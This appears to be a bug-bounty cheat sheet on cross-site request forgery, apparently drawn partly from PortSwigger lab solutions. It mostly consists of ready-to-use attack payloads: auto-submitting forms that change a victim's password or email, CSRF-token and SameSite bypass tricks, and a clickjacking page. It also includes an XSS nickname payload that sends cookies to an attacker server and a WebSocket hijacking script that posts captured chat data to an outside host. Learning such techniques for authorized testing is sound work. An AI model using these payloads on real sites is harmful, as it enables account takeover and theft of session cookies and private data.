### CSRF Vulnerability Exploration

For CSRF vulnerabilities, we usually require a webpage hosted on the internet to display its impact. To test this, you can either use Burp-Suite CSRF-poc generator or utilize services like Interactsh to put your code into action.

Start your hunt by following these steps:

1. Look for state-changing requests.
2. Investigate the lack of CSRF protection, such as the absence of a CSRF-token header or no SameSite=Lax/Strict headers.
3. Craft a Proof of Concept (POC).

Here's an example POC:

```html
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
    <input type="text" name="new_password" value="abc123">
    <input type="submit" value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

### Bypass Techniques

- **Exploit Clickjacking:**

```html
<html>
<head>
    <title>Clickjack test page</title>
</head>
<body>
    <p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
    <iframe src="PAGE_URL" width="500" height="500"></iframe>
</body>
</html>
```

- **Bypass CSRF-Token Protection:**

    - Circumventing strategies:
        - Turn POST request into a GET request.
        - Servers might not validate the source of the CSRF token, so you can use your own accounts.
        - Add the tag `<meta name="referrer" content="never">`.
        - If the server requires a domain name, use "@" in the link.
        - If the server only accepts a domain name, try buying a subdomain.

    - Bypass referrer header check by:
    
    ```html
    <meta name="referrer" content="no-referrer">
    ```

- **Self XSS via CSRF:**

```html
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;</script>"
&csrf_token='' - leave blank
```

This injects XSS in the nickname field and steals the cookies.

- **CSRF POC:**

```html
<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
    <input type="text" name="new_password" value="this_account_is_now_mine">
    <input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

Bypass using XSS as mentioned in the XSS guide in this repository.

- **SameSite: Lax Bypass via Method Override:**

```html
GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
```

Via client-side redirect:

```html
document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
```

- **CSRF through Cross-Site WebSocket Hijacking:**

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

- **Bypass Popup and SameSite via Cookie Refresh:**

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

- **Referrer and Referrer-Policy Bypass:**

Referer: `https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net` then add in POC

```html
Referrer-Policy: unsafe-url
```
